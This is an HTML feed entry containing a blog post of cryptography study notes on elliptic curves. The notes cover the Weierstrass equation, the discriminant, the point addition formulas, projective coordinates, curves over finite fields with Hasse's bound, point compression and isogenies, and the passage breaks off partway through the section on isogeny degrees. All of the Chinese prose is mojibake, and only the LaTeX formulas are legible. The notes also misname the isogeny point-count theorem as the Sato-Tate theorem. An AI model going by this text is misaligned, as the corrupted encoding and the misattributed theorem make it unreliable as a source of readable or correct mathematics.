        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰</h2><hr><h1 id="æ¤­åœ†æ›²çº¿"><a href="#æ¤­åœ†æ›²çº¿" class="headerlink" title="æ¤­åœ†æ›²çº¿"></a>æ¤­åœ†æ›²çº¿</h1><hr><h2 id="æ¤­åœ†æ›²çº¿-elliptic-curve"><a href="#æ¤­åœ†æ›²çº¿-elliptic-curve" class="headerlink" title="æ¤­åœ†æ›²çº¿(elliptic curve)"></a>æ¤­åœ†æ›²çº¿(elliptic curve)</h2><p><strong>å®šä¹‰</strong>ï¼š<strong>æ¤­åœ†æ›²çº¿</strong>æ˜¯ä¸€æ¡ç”±æ–¹ç¨‹$y^2=x^3+ax+b$ç»™å®šçš„æ›²çº¿ï¼Œå…¶ä¸­ $a,b\in F,char(F)\neq 2,3$ï¼Œï¼Œå¹¶æ»¡è¶³ $\Delta=4a^3+27b^2\neq0$ ã€‚<br>ä¸¢ç•ªå›¾æ›²çº¿ï¼š$y^2=x^3-x+9$ ($a=-1,b=9)$, ($x,y)\in\mathbb{Q}^2$</p><p>$\Delta\neq0$:éå¥‡å¼‚(non-singular),<strong>å…‰æ»‘</strong>ï¼Œ$x^3+ax+b$æ— é‡æ ¹<br>$\Delta=0$:å¥‡å¼‚ (singular),ä¸å…‰æ»‘ï¼Œ$x^3+ax+b$<strong>æœ‰é‡æ ¹(å¥‡å¼‚ç‚¹)</strong></p><blockquote><p>è¡¥å……ï¼šæœ‰é‡æ ¹è¯´æ˜å¤šé¡¹å¼å’Œå®ƒçš„å¯¼æ•°å­˜åœ¨å…¬å…±æ ¹</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822164917677.png" alt="å¥‡å¼‚ç‚¹"></p><p>å‰ä¸¤ä¸ªå«<strong>ç»“ç‚¹(node)</strong>ï¼Œç¬¬ä¸‰ä¸ªå«<strong>å°–ç‚¹(cusp)</strong></p><p><strong>å¥‡å¼‚ç‚¹</strong>ï¼š</p><ul><li>è¯¥ç‚¹å¤„æ›²çº¿ä¸å¯å¾®åˆ†ï¼Œå³å¥‡å¼‚ç‚¹å¤„æ— æ³•ä½œåˆ‡çº¿(åˆ‡çº¿å€¼æ— å®šä¹‰)</li><li>åªè¦æ¤­åœ†æ›²çº¿æ˜¯å¥‡å¼‚çš„ï¼Œå¥‡å¼‚ç‚¹å°±ä¸€å®šåœ¨xè½´ä¸Š</li><li>å½“ç‚¹çš„é›†åˆåŒ…å«å¥‡å¼‚ç‚¹æ—¶æ— æ³•æ„æˆç¾¤ï¼Œå› ä¸ºå¥‡å¼‚ç‚¹å¤„æ— æ³•ä½œåˆ‡çº¿ï¼Œæ•…è®¨è®ºæ¤­åœ†æ›²çº¿æ—¶æ’é™¤å¥‡å¼‚çš„æƒ…å†µ</li><li>å¥‡å¼‚ç‚¹åˆ°åŸç‚¹çš„è·ç¦»æ˜¯å·¦æ ¹åˆ°åŸç‚¹çš„è·ç¦»çš„ä¸€åŠ</li></ul><p><strong>åˆ¤åˆ«å¼</strong>:</p><p>$\Delta&lt;0$æ—¶ï¼š</p><ul><li>å›¾åƒæœ‰ä¸€ä¸ªç»„æˆéƒ¨åˆ†</li><li>$x^3+ax+b=0$åªæœ‰å”¯ä¸€çš„å®æ•°æ ¹</li></ul><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822165700141-1724317031959-1.png" alt="åˆ¤åˆ«å¼å°äº0"></p><p>$\Delta&gt;0$æ—¶ï¼š</p><ul><li>å›¾åƒæœ‰ä¸¤ä¸ªç»„æˆéƒ¨åˆ†</li><li>$x^3+ax+b=0$æœ‰ä¸‰ä¸ªä¸åŒçš„å®æ•°æ ¹</li></ul><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822165825940.png" alt="åˆ¤åˆ«å¼å¤§äº0"></p><ul><li><strong>æ¤­åœ†æ›²çº¿</strong>ï¼šé­å°”æ–¯ç‰¹æ‹‰æ–¯æ–¹ç¨‹ $y^2=x^3+ax+b$å®šä¹‰åœ¨åŸŸä¸Šçš„ä¸€æ¡å…‰æ»‘å°„å½±<strong>äºæ ¼(genus)ä¸º1</strong>çš„æ›²çº¿ã€‚</li><li><strong>æ¤­åœ†</strong>ï¼š<strong>äºæ ¼ä¸º0</strong>çš„æ›²çº¿ã€‚</li></ul></blockquote><h3 id="æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹"><a href="#æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹" class="headerlink" title="æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹"></a>æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹</h3><script type="math/tex; mode=display">E=\{(x,y)|y^2=x^3+ax+b\}\cup\{O\}</script><p>æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹é€šå¸¸ç”¨Pã€Qæˆ–Rè¡¨ç¤º<br>O:<strong>æ— ç©·è¿œç‚¹(point at infinity)</strong></p><hr><h2 id="åŠ æ³•"><a href="#åŠ æ³•" class="headerlink" title="åŠ æ³•"></a>åŠ æ³•</h2><h3 id="å‡ ä½•è¡¨ç¤º"><a href="#å‡ ä½•è¡¨ç¤º" class="headerlink" title="å‡ ä½•è¡¨ç¤º"></a>å‡ ä½•è¡¨ç¤º</h3><p>ç¾¤ï¼š$(E,+)$<br>åŠ æ³•è¿ç®—+: $E$é‡Œç‚¹å’Œç‚¹ä¹‹é—´çš„åŠ æ³•(å¹¶éç®€å•çš„åæ ‡é—´åŠ æ³•ï¼Œè€Œæ˜¯ä¸€ç§å‡ ä½•çš„æ–¹æ³•)</p><p>$(E,+)$<strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong>å¯¹äº$\forall P,Q,R\in E$,éƒ½æœ‰</p><ul><li>å°é—­æ€§ï¼š$P+Q\in E$</li><li>ç»“åˆå¾‹ï¼š$(P+Q)+R=P+(Q+R)$</li><li>å•ä½å…ƒï¼š$P+O=O+P=P$ (<strong>æ— ç©·è¿œç‚¹$O$æ˜¯å•ä½å…ƒ</strong>)</li><li>é€†å…ƒï¼š$P+(-P)=O$    ($P=(x_1,y_1),-P=(x_1,-y_1)$)</li><li>äº¤æ¢å¾‹ï¼š$P+Q=Q+P$</li></ul><p><strong>æ¤­åœ†æ›²çº¿ä¸‰ä¸ªç‚¹åœ¨ä¸€æ¡ç›´çº¿ä¸Šæ—¶ï¼Œä¸‰ä¸ªç›¸åŠ ç­‰äºæ— ç©·è¿œç‚¹</strong></p><p><strong>4ç§æƒ…å†µ</strong>:</p><ul><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160653715.png" alt="æƒ…å†µ1"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160748703.png" alt="æƒ…å†µ2"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160818652.png" alt="æƒ…å†µ3"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160906817.png" alt="æƒ…å†µ4"></li></ul><p>$nP:=P+P+\cdots+P$<br>$0P=O,\quad(-n)P=-(nP)$</p><p><strong>ç‚¹Pçš„é˜¶</strong>ï¼š$\text{æ»¡è¶³ }nP=O\text{çš„æœ€å°æ­£æ•´æ•°}n$</p><h3 id="åæ ‡è¡¨ç¤º"><a href="#åæ ‡è¡¨ç¤º" class="headerlink" title="åæ ‡è¡¨ç¤º"></a>åæ ‡è¡¨ç¤º</h3><p>$P=(x_1,y_1),Q=(x_2,y_2)$,åˆ™$P+Q$ æœ‰å››ç§æƒ…å†µ:</p><ol><li>$P\neq Q$ ä¸”$x_1\neq x_2$</li><li>$P\neq Q$ ä¸”$x_1 = x_2 : P+Q=O$</li><li>$P=Q$ä¸”$y_1\neq0$</li><li>$P=Q$ä¸”$y_1=0:P+P=2P=O$</li></ol><script type="math/tex; mode=display">\text{è®¾ }P=(x_1,y_1),Q=(x_2,y_2),\quad\text{ç›´çº¿ }L\text{æ–¹ç¨‹ä¸º }y=\lambda x+c,\text{ åˆ™}\\\lambda=\begin{cases}\dfrac{y_2-y_1}{x_2-x_1},&P\neq Q\text{ ä¸” }x_1\neq x_2\\\dfrac{3x_1^2+a}{2y_1},&P=Q\text{ ä¸” }y_1\neq0(éšå‡½æ•°æ±‚å¯¼ç®—æ–œç‡)\end{cases}</script><script type="math/tex; mode=display">c=y_1-\lambda x_1=\begin{cases}\frac{y_1x_2-y_2x_1}{x_2-x_1},&\quad P\neq Q\text{ ä¸” }x_1\neq x_2\\\frac{-x_1^3+ax_1+2b}{2y_1},&\quad P=Q\text{ ä¸” }y_1\neq0\end{cases}</script><script type="math/tex; mode=display">\begin{gathered}(\lambda x+c)^{2}=x^{3}+ax+b \\f(x)=x^{3}+ax+b-(\lambda x+c)^{2} \\\text{è®¾ }R=(x_3,y_3),\text{åˆ™} \\f(x)=(x-x_{1})(x-x_{2})(x-x_{3}) \\x^3+ax+b-(\lambda x+c)^2=(x-x_1)(x-x_2)(x-x_3)\end{gathered}</script><script type="math/tex; mode=display">\begin{aligned}&x^3-\lambda^2x^2-2\lambda cx+ax+b-c^2\\&=x^3-(x_1+x_2+x_3)x^2+(x_1x_2+x_1x_3+x_2x_3)x-x_1x_2x_3\\&\lambda^2=x_1+x_2+x_3\Longrightarrow x_3=\lambda^2-x_1-x_2\\&y_{3}=\lambda x_{3}+c\end{aligned}</script><script type="math/tex; mode=display">\begin{aligned}P+Q=-R& =(x_3,-y_3)=(\lambda^2-x_1-x_2,-\lambda x_3-c) \\&=\left(\lambda^2-x_1-x_2,-\lambda^3+(x_1+x_2)\lambda-c\right)\end{aligned}</script><h3 id="ç‚¹çš„åŠ æ³•ç®—æ³•"><a href="#ç‚¹çš„åŠ æ³•ç®—æ³•" class="headerlink" title="ç‚¹çš„åŠ æ³•ç®—æ³•"></a>ç‚¹çš„åŠ æ³•ç®—æ³•</h3><p>$P=(x_1,y_1),Q=(x_2,y_2)$,æ¤­åœ†æ›²çº¿ä¸º$x^3+ax+b:$</p><ul><li><p>if  $\left(P\neq Q\mathrm{~and~}x_1=x_2\right)$or$\left(P=Q\mathrm{~and~}y_1=0\right)$</p><p>â€‹        return $O$</p></li><li><p>if  $P\neq Q$ and $x_1\neq x_2$ï¼Œ      $\lambda=\frac{y_2-y_1}{x_2-x_1}\:,\:c=\frac{y_1x_2-y_2x_1}{x_2-x_1}$</p><p>else      $\lambda=\frac{3x_{1}^{2}+a}{2y_{1}},c=\frac{-x_{1}^{3}+ax_{1}+2b}{2y_{1}}$$(å³P=Q$ and $y_1\neq0)$</p></li><li><p>return $(x_3,-y_3)=(\lambda^2-x_1-x_2,-\lambda^3+(x_1+x_2)\lambda-c)$</p></li></ul><p><strong>å®šç†</strong> (PoincarÃ©,çº¦1900å¹´):è®¾$F$æ˜¯åŸŸï¼Œæ¤­åœ†æ›²çº¿æ–¹ç¨‹ä¸º<br>$x^3+ax+b,a,b\in F$,åŠ$E=\begin{Bmatrix}(x,y)&amp;x^3+ax+b\end{Bmatrix}\cup\begin{Bmatrix}0\end{Bmatrix}$<br>è®¾$E(F)=\{(x,y)\in E\mid x,y\in F\}\cup\{O\}$,åˆ™$E(F)$æ˜¯$E$çš„å­ç¾¤</p><hr><h2 id="æ— ç©·è¿œç‚¹"><a href="#æ— ç©·è¿œç‚¹" class="headerlink" title="æ— ç©·è¿œç‚¹"></a>æ— ç©·è¿œç‚¹</h2><p><strong>ä»¿å°„å¹³é¢</strong>ï¼šä»¿å°„åæ ‡$(x,y)\in A^2(F)$<br><strong>å°„å½±å¹³é¢</strong>ï¼šå°„å½±åæ ‡$(X,Y,Z)\in P^2(F)$<br>$(0,0,0)\notin P^2(F)$<br><strong>è½¬æ¢å…¬å¼</strong>ï¼š$x=\frac{X}{Z},y=\frac{Y}{Z}$</p><blockquote><p>ä¾‹ï¼šä»¿å°„åæ ‡<script type="math/tex">(x,y)=(3,2)</script><br>å°„å½±åæ ‡<script type="math/tex">(X{:}Y{:}Z)=(3{:}2{:}1)</script>ï¼ˆX,Y,Zï¼‰=(3Z,2Z,Z)</p></blockquote><p><strong>ä»¿å°„ç‚¹</strong>ï¼šåæ ‡å½¢å¼ä¸º$(X:Y:1)$çš„ç‚¹</p><h3 id="æ— ç©·è¿œç‚¹çš„åæ ‡"><a href="#æ— ç©·è¿œç‚¹çš„åæ ‡" class="headerlink" title="æ— ç©·è¿œç‚¹çš„åæ ‡"></a>æ— ç©·è¿œç‚¹çš„åæ ‡</h3><p>$x=\frac X0,y=\frac Y0$</p><p><strong>ä»¿å°„</strong>åæ ‡(æ— æ³•è¡¨ç¤º)$\longleftarrow$<strong>å°„å½±</strong>åæ ‡$(X:Y:0)$</p><h3 id="æ— ç©·è¿œçº¿-line-at-infinity"><a href="#æ— ç©·è¿œçº¿-line-at-infinity" class="headerlink" title="æ— ç©·è¿œçº¿(line at infinity)"></a>æ— ç©·è¿œçº¿(line at infinity)</h3><p>æ— ç©·è¿œç‚¹$(X:Y:0)$<br>æ— ç©·è¿œçº¿ï¼š$(X:1:0)$å’Œ$(1:0:0)$å½¢æˆçš„ç›´çº¿,åµŒåœ¨å°„å½±å¹³é¢ç”¨$P^1(F)$è¡¨ç¤º</p><hr><h2 id="æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿"><a href="#æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿" class="headerlink" title="æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿"></a>æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿</h2><p>$Z_p:$ æ¤­åœ†æ›²çº¿å¯†ç å¸¸ç”¨çš„æœ‰é™åŸŸ $(p&gt;3$æ˜¯ç´ æ•°)</p><script type="math/tex; mode=display">F_p\cong Z_p</script><p>å®šä¹‰åœ¨$F_p$ä¸Šçš„æ¤­åœ†æ›²çº¿(åæ ‡è¿ç®—éƒ½æ˜¯æ¨¡$p$çš„)</p><p>æ–¹ç¨‹ï¼š$y^2\equiv x^3+ax+b\pmod p$),å…¶ä¸­$a,b\in F_p$æ˜¯å¸¸æ•°</p><p>æ»¡è¶³ï¼š$\Delta=4a^3+27b^2\not\equiv0\pmod p$ã€‚</p><p>ç‚¹ï¼š$(x,y)\in F_p\times F_p$<br>ç¾¤ï¼š$E(F_p)$</p><p>$y^2\equiv x^3+ax+b\pmod p$</p><p>$|E(F_p)|\leq2p+1(\text{æ¯ä¸ª}x\text{å¯¹åº”ä¸¤ä¸ª}y\text{,è€Œ}x\text{çš„å–å€¼ä¸è¶…è¿‡}p\text{ä¸ª},æ­¤å¤„åŠ ä¸Šæ— ç©·è¿œç‚¹)$</p><p><strong>å®šç† (Hasse,1933)</strong>: $p+1-2\sqrt{p}\leq\left|E(F_p)\right|\leq p+1+2\sqrt{p}$<br><strong>Schoof ç®—æ³•</strong>ï¼šè®¡ç®— $|E(F_p)|$çš„å¤§å°<br>(æ—¶é—´å¤æ‚åº¦ï¼š$O((logp)^8)$ä¸ªæ¯”ç‰¹è¿ç®—å’Œ$\mathcal{O}((logp)^6)$ä¸ª$\mathbb{Z}_p$ä¸­è¿ç®—)</p><p><strong>å®šç†</strong>ï¼š$E(F_p)$æ˜¯å¾ªç¯ç¾¤æˆ–åŒæ„äºä¸¤ä¸ªå¾ªç¯ç¾¤çš„ç¬›å¡å°”ä¹˜ç§¯$(p&gt;3)$<br>$E(F_p)\cong Z_{n_2}\times Z_{n_1}$</p><p>$E(F_p)\cong Z_{n_2}\times Z_{n_1}$<br>$n_2\mid n_1,n_2\mid(p-1)$</p><p><strong>å®šç†</strong>:$|E(F_p)|$æ˜¯ç´ æ•°æˆ–ä¸¤ä¸ªä¸åŒç´ æ•°ä¹˜ç§¯,åˆ™$E(F_p)$æ˜¯å¾ªç¯ç¾¤$(p&gt;3)$</p><hr><h2 id="ç‚¹å‹ç¼©-point-compress"><a href="#ç‚¹å‹ç¼©-point-compress" class="headerlink" title="ç‚¹å‹ç¼©(point compress)"></a>ç‚¹å‹ç¼©(point compress)</h2><p>$(x,y)è½¬ä¸ºå­˜å‚¨(x,y\ mod\ 2),å³yæ˜¯å¥‡æ•°å­˜å‚¨(x,1),yæ˜¯å¶æ•°å­˜å‚¨(x,0),yæ˜¯å¶æ•°$</p><h3 id="ç‚¹è§£å‹-point-decompress"><a href="#ç‚¹è§£å‹-point-decompress" class="headerlink" title="ç‚¹è§£å‹(point decompress)"></a>ç‚¹è§£å‹(point decompress)</h3><p>$(x,y\ mod\ 2)$<br>$y^2=x^3+ax+b\ mod\ p$<br>$y=\pm\sqrt{x^3+ax+b}\:mod\:p\longrightarrow y_1=yï¼Œy_2=p-y$</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822184615584.png" alt="ç‚¹å‹ç¼©ä¸ç‚¹è§£å‹"></p><hr><h2 id="åŒæº-isogeny"><a href="#åŒæº-isogeny" class="headerlink" title="åŒæº(isogeny)"></a>åŒæº(isogeny)</h2><p>æ¤­åœ†æ›²çº¿çš„ç»“æ„ç‰¹ç‚¹</p><ul><li>å‡ ä½•ç»“æ„(å…‰æ»‘å°„å½±æ›²çº¿)</li><li>ä»£æ•°ç»“æ„(ç‚¹ç¾¤$E$)</li></ul><p><strong>åŒæº</strong>æ˜¯ä¸€ç§ä¿æŒæ¤­åœ†æ›²çº¿ç»“æ„çš„æ˜ å°„</p><script type="math/tex; mode=display">\text{åŒæº }\phi{:}E(K)\to E^{\prime}(K)\text{ æ˜¯ä¸ªç¾¤åŒæ€(æ»¡åŒæ€)(}K\text{æ˜¯åŸŸ)}</script><ul><li>$\phi(O)=O^{\prime}$</li></ul><p><strong>è‡ªåŒæ€ (endomorphism)</strong>: æ¤­åœ†æ›²çº¿åˆ°è‡ªèº«çš„åŒæº<br><strong>è‡ªåŒæ„ (automorphism)</strong>: åŒæºæ˜¯è‡ªåŒæ€ï¼Œä¹Ÿæ˜¯åŒæ„</p><p><strong>æ³¨æ„</strong>ï¼šè‡ªåŒæ€æœªå¿…æ˜¯åŒæºï¼Œæ¯”å¦‚ï¼š$\forall P\in E(K),\phi(P)=O$ ,æ˜¯è‡ªåŒæ€ï¼Œä½†ä¸æ˜¯åŒæº(å› ä¸ºä¸æ˜¯æ»¡åŒæ€)</p><blockquote><p>ä¾‹ï¼š$\phi{:}E(K)\to E(K)$ï¼Œè®°$\phi:=[n]$<br>$P\mapsto nP$<br>è‡ªåŒæ€ $(n=0$æ—¶ä¸æ˜¯åŒæº)<br>$n\neq0:$åŒæº<br>$n=\pm1:$è‡ªåŒæ„</p><p>å¯¹äºå¤§å¤šæ•°æ¤­åœ†æ›²çº¿ï¼Œå”¯ä¸€çš„è‡ªåŒæ€å°±æ˜¯è¿™ç§å½¢å¼çš„åŒæº</p></blockquote><h3 id="åŒæºçš„æ ‡å‡†å½¢å¼"><a href="#åŒæºçš„æ ‡å‡†å½¢å¼" class="headerlink" title="åŒæºçš„æ ‡å‡†å½¢å¼"></a>åŒæºçš„æ ‡å‡†å½¢å¼</h3><p>è®¾ $\phi{:}E(K)\to E^{\prime}(K)$ æ˜¯åŒæº $(K$æ˜¯åŸŸ),ç‚¹$P=(x,y)\in E(K)$,<br>åˆ™ä»¿å°„åæ ‡ä¸‹ï¼Œ$\phi$å…·æœ‰ä»¥ä¸‹æ ‡å‡†å½¢å¼(standard form):</p><script type="math/tex; mode=display">\phi(x,y)=(\frac{u(x)}{v(x)},\frac{s(x)}{t(x)}y)</script><p>å…¶ä¸­$u(x),v(x),s(x),t(x)\in K[X],u(x),v(x)$äº’ç´ ï¼Œ$s(x),t(x)$äº’ç´ ã€‚</p><p><strong>æ¨è®º</strong>ï¼šè®¾$E(K)$ çš„æ–¹ç¨‹ä¸º $y^2= x^3+ ax+ b$, $f( x) = x^3+ ax+b$,åˆ™ï¼š<br>$v^3(x)\mid t^2(x)$<br>$t^2(x)\mid v^3(x)f(x)$<br>åŒæº$\phi{:}E(K)\to E^{\prime}(K)$æ˜¯åŒæº (Kæ˜¯åŸŸ)<br>$\phi(x,y)=(\frac{u(x)}{v(x)},\frac{s(x)}{t(x)}y)$</p><h3 id="å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€-Frobenius-endomorphism"><a href="#å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€-Frobenius-endomorphism" class="headerlink" title="å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€(Frobenius endomorphism)"></a>å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€(Frobenius endomorphism)</h3><p>$\pi{:}E(F_q)\to E(F_q)$<br>$(X{:}Y{:}Z)\mapsto(X^q:Y^q:Z^q)$</p><p>$E(F_q)$çš„æ–¹ç¨‹$y^2=x^3+ax+b,a,b\in F_q,(x,y)\in F_q^2$<br>$\pi(x,y)=(x^q,\:(x^3+ax+b)^{\frac{q-1}2}y)$</p><p>$u(x)=x^qï¼Œv(x)=eï¼Œs(x)=(x^3+ax+b)^{\frac{q-1}2}ï¼Œt(x)=e$</p><blockquote><p>æ³¨ï¼šè‹¥$F_q$çš„ç‰¹å¾æ˜¯ç´ æ•°$p$<br>$\boldsymbol{\pi}^{\prime}:E(F_q)\to E^{\prime}(F_q)$<br>$(X{:}Y{:}Z)\mapsto(X^p{:}Y^p{:}Z^p)$<br>åŒæº(æœªå¿…æ˜¯è‡ªåŒæ€)</p></blockquote><p><strong>å®šç† (Sato-Tateå®šç†)</strong>ï¼š$\left|E(F_q)\right|=\left|E^{\prime}(F_q)\right|,å½“ä¸”ä»…å½“,è¿™ä¸¤ä¸ªæ¤­åœ†æ›²çº¿åŒæºã€‚$</p><h3 id="åŒæºçš„åº¦-degree-of-isogeny"><a href="#åŒæºçš„åº¦-degree-of-isogeny" class="headerlink" title="åŒæºçš„åº¦(degree of isogeny)"></a>åŒæºçš„åº¦(degree of isogeny)</h3><p>å®šä¹‰(åŒæºçš„åº¦): $\phi(x,y)=(\frac {u(x)}{v(x)},\frac{s(x)}{t(x)}y)$æ˜¯æ ‡å‡†å½¢å¼ï¼ŒåŒæº$\phi$çš„åº¦æ˜¯<br>$deg(\phi):=\max(deg(u(x)),deg(v(x)))ã€‚$</p><h3 id="åŒæºçš„å¯åˆ†æ€§-separability"><a href="#åŒæºçš„å¯åˆ†æ€§-separability" class="headerlink" title="åŒæºçš„å¯åˆ†æ€§(separability)"></a>åŒæºçš„å¯åˆ†æ€§(separability)</h3><p><strong>å®šä¹‰(å¯åˆ†æ€§)</strong>: $\phi(x,y)=(\frac {u(x)}{v(x)},\frac{s(x)}{t(x)}y)$æ˜¯æ ‡å‡†å½¢å¼ï¼Œ<br>å¦‚æœ $(\frac{u(x)}{v(x)})^{\prime}\neq\theta$,åˆ™ç§°$\phi$æ˜¯<strong>å¯åˆ†çš„(separable);</strong><br>å¦‚æœ ($\frac{u(x)}{v(x)})^{\prime}=\theta$,åˆ™ç§°$\phi$æ˜¯<strong>ä¸å¯åˆ†çš„ (inseparable)ã€‚</strong></p><h3 id="åŒæºçš„åˆ†è§£"><a href="#åŒæºçš„åˆ†è§£" class="headerlink" title="åŒæºçš„åˆ†è§£"></a>åŒæºçš„åˆ†è§£</h3><p>ä»»ä½•ç‰¹å¾å¤§äº0çš„åŒæºéƒ½å¯ä»¥åˆ†è§£æˆå¯åˆ†åŒæºå’Œä¸å¯åˆ†åŒæºçš„å¤åˆ</p><p><strong>å¼•ç†1</strong>ï¼šåŸŸ$K$çš„ç‰¹å¾æ˜¯$p$ã€‚è®¾å¤šé¡¹å¼ $u(x),v(x)\in K[X]$äº’ç´ ï¼Œåˆ™<br>$(\frac{u(x)}{v(x)})^{\prime}=\theta\Leftrightarrow u^{\prime}(x)=v^{\prime}(x)=\theta$<br>$\Leftrightarrow u(x)=f(x^{p}),v(x)=g(x^{p})\:,$<br>å…¶ä¸­$f(x)$,g$(x)\in K[X]$</p><p><strong>å¼•ç†2</strong>ï¼š$\phi{:}E(K)\to E^{\prime}(K)$æ˜¯ä¸å¯åˆ†åŒæºï¼Œ$K$ çš„ç‰¹å¾æ˜¯$p$ ã€‚åˆ™æ ‡å‡†å½¢å¼ä¸‹ï¼Œæœ‰</p><script type="math/tex; mode=display">\phi(x,y)=\phi(a(x^p),b(x^p)y^p)\:,</script><p>å…¶ä¸­$a(x),b(x)\in K[X]$</p><p><strong>æ€§è´¨</strong>ï¼šåŒæº$\phi{:}E(K)\to E^{\prime}(K)$,$K$çš„ç‰¹å¾æ˜¯$p&gt;0$,åˆ™æœ‰<br>$\phi=\alpha\circ(\pi^{\prime})^n,$<br>å…¶ä¸­ $\alpha$æ˜¯å¯åˆ†åŒæºï¼Œ$\pi^{\prime}$æ˜¯$p$ -power å¼—ç½—è´å°¼ä¹Œæ–¯æ˜ å°„ï¼Œ$n\geq0$ã€‚<br>æ³¨ï¼š$\pi^\prime:(X{:}Y{:}Z)\mapsto(X^p{:}Y^p{:}Z^p)$</p><script type="math/tex; mode=display">\begin{aligned}&&&\bullet\phi æ˜¯å¯åˆ†åŒæ¼”:è®¾n=0,\alpha=\alpha,\phi,åˆ™æ»¡è¶³\phi=\alpha\circ(\pi^{\prime})^{n},\\&&&\bullet\phi æ˜¯ä¸å¯åˆ†åŒæº:æ ¹æ®å¼•ç†2ã€‚æœ‰\phi(x,y)=\phi(a(x^p),b(x^p)y^p)ã€‚\\&&&\text{è®¾ }\alpha_1(x,y):=(a(x),b(x)y),\text{ æœ‰ }\phi=\alpha_1\circ\pi^{\prime}ã€‚\\&&&\text{å¦‚æœ }\alpha_1\text{æ˜¯å¯åˆ†åŒæº,åˆ™æ»¡è¶³ }\phi=\alpha\circ(\pi^{\prime})^n\quad(n=1,\alpha:=\alpha_1);\\&&&\text{å¦‚æœ }\alpha_1\text{ æ˜¯ä¸å¯åˆ†åŒæº,æ ¹æ®å¼•ç†2, æœ‰}\\&&&\alpha_1(x,y)=\alpha_1(a_1(x^p),b_1(x^p))y^n)ã€‚\\&&&\text{è®¾ }\alpha_2(x,y)=(\alpha_1(x),b_1(x)),\text{ æœ‰ }\alpha_1=\alpha_2\circ\pi^{\prime},\\&&&\text{åˆ™ }\phi(x,y)=\alpha_1\circ\pi^{\prime}=\alpha_2\circ\pi^{\prime}\circ\pi^{\prime}=\alpha_2\circ(\pi^{\prime})^2ã€‚\\&&&\text{ä¾æ­¤ç±»æ¨,æœ‰ }\phi=\alpha_n\circ(\pi^{\prime})^n\text{ã€‚ä»¤}\alpha:=\alpha_n,\text{ æœ‰}\phi=\alpha\circ(\pi^{\prime})^n\text{ã€‚}\end{aligned}</script><h3 id="åº¦çš„åˆ†è§£"><a href="#åº¦çš„åˆ†è§£" class="headerlink" title="åº¦çš„åˆ†è§£"></a>åº¦çš„åˆ†è§£</h3><p><strong>å®šä¹‰(åº¦çš„åˆ†è§£)</strong>:å¯¹äºåŒæºçš„åˆ†è§£ $\phi=\alpha\circ(\pi^{\prime})^n$,è®¾$deg_s\phi$æ˜¯å…¶å¯<br>åˆ†åº¦ (separable degree), $deg_i\phi$æ˜¯å…¶ä¸å¯åˆ†åº¦ (inseparable<br>degree),åˆ™<br>$deg_s\phi:=deg\alpha,\:deg_i\phi:=p^n,$<br>è€Œä¸”æ€»æ˜¯æœ‰<br>$deg\phi=(deg_s\phi)\cdot(deg_i\phi)=deg\ \alpha\cdot p^n$</p><blockquote><p>ä¾‹ï¼š<script type="math/tex">\begin{aligned}&\phi=(\pi^{\prime})^n\\&(\pi^{\prime})^n\text{çš„ç‰¹å¾å¤§äº0,æ˜¯å¯åˆ†è§£çš„ã€‚}\\&\text{è®¾ }(\pi^{\prime})^n=\alpha\circ(\pi^{\prime})^n\text{,åˆ™æœ‰ }\alpha:P\mapsto Pã€‚\\&\text{æ‰€ä»¥,}deg\alpha=1\text{ã€‚æ•…è€Œ,}deg_s\pi^{\prime}=1ã€‚\end{aligned}</script></p></blockquote><p><strong>å®šä¹‰(çº¯ä¸å¯åˆ†åŒæº)</strong>:å¯åˆ†åº¦æ˜¯1çš„åŒæº,å«çº¯ä¸å¯åˆ†çš„(purely 